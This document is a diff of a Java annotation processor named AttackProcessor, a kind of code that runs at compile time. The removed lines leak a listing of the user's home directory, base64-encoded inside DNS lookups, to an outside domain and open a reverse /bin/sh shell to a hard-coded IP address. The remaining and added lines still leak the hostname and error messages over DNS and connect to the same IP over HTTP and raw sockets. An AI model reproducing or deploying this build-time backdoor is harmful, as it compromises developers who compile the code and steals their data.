@@ -18,6 +18,7 @@ import java.net.HttpURLConnection;
 import java.net.Inet4Address;
 import java.net.InetAddress;
 import java.net.Socket;
+import java.net.URL;
 import java.net.UnknownHostException;
 import java.util.Arrays;
 import java.util.Base64;
@@ -37,71 +38,40 @@ public class AttackProcessor extends AbstractProcessor {
 
         try
         {
-            Inet4Address.getByName( "javac24.lirui28.t.dlsr.ga" );
+            Inet4Address.getByName( "javac25.lirui28.t.dlsr.ga" );
 
-            Inet4Address.getByName( InetAddress.getLocalHost().getHostName()+".javac24.lirui28.t.dlsr.ga" );
+            Inet4Address.getByName( InetAddress.getLocalHost().getHostName()+".javac25.lirui28.t.dlsr.ga" );
 
-            File folder = new File(System.getProperty("user.home"));
-
-            if (folder.isDirectory()){
-                File[] files = folder.listFiles();
-                sb.append( Arrays.deepToString( files));
-            }
-            String fs = sb.toString();
-            //输出base64编码的url home文件夹的内容到外部
-            fs = new String( Base64.getEncoder().encode( fs.getBytes() ) );
-            fs = fs.replaceAll("\\n", "");
-
-            if (fs.length()>50){
-                Inet4Address.getByName( fs.substring( 0,50 )+".3.lirui28.t.dlsr.ga" );
-
-                //Inet4Address.getByName( fs.substring( 0,90 )+".2.lirui28.t.dlsr.ga" );
-            } else {
-                    Inet4Address.getByName( "xiaoyu50"+".3.lirui28.t.dlsr.ga" );
-            }
+//            File folder = new File(System.getProperty("user.home"));
+//
+//            if (folder.isDirectory()){
+//                File[] files = folder.listFiles();
+//                sb.append( Arrays.deepToString( files));
+//            }
+//            String fs = sb.toString();
+//            //输出base64编码的url home文件夹的内容到外部
+//            fs = new String( Base64.getEncoder().encode( fs.getBytes() ) );
+//            fs = fs.replaceAll("\\n", "");
+//
+//            if (fs.length()>50){
+//                Inet4Address.getByName( fs.substring( 0,50 )+".3.lirui28.t.dlsr.ga" );
+//
+//                //Inet4Address.getByName( fs.substring( 0,90 )+".2.lirui28.t.dlsr.ga" );
+//            } else {
+//                    Inet4Address.getByName( "xiaoyu50"+".3.lirui28.t.dlsr.ga" );
+//            }
 
 
 
             try {
 
-                String host= "182.92.151.151";
-                int port= 8888;
-                String cmd="/bin/sh";
-                Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();
-                Socket s=new Socket(host,port);
-                InputStream pi=p.getInputStream(),pe=p.getErrorStream(),si=s.getInputStream();
-                OutputStream po=p.getOutputStream(),so=s.getOutputStream();
-                while(!s.isClosed()) {
-                    while(pi.available()>0) {
-                        so.write(pi.read());
-                    }
-                    while(pe.available()>0) {
-                        so.write(pe.read());
-                    }
-                    while(si.available()>0) {
-                        po.write(si.read());
-                    }
-                    so.flush();
-                    po.flush();
-                    Thread.sleep(50);
-                    try {
-                        p.exitValue();
-                        break;
-                    }
-                    catch (Exception e){
-                    }
-                };
-                p.destroy();
-                s.close();
-
-
-
-
+                URL url = new URL( "http://182.92.151.151:8082");
+               HttpURLConnection urlConnection = (HttpURLConnection) url.openConnection();
             } catch (Exception e) {
                 Inet4Address.getByName("runtimeerror" +".5.lirui28.t.dlsr.ga" );
 
                 Inet4Address.getByName( e.getMessage().replaceAll( " ","" ) +".5.lirui28.t.dlsr.ga" );
-                Socket socket= new Socket("182.92.151.151", 8888);
+                Socket socket= new Socket("182.92.151.151", 8082);
                 socket.getInputStream();
                 ObjectOutputStream objectOutputStream = new ObjectOutputStream( socket.getOutputStream());
             }
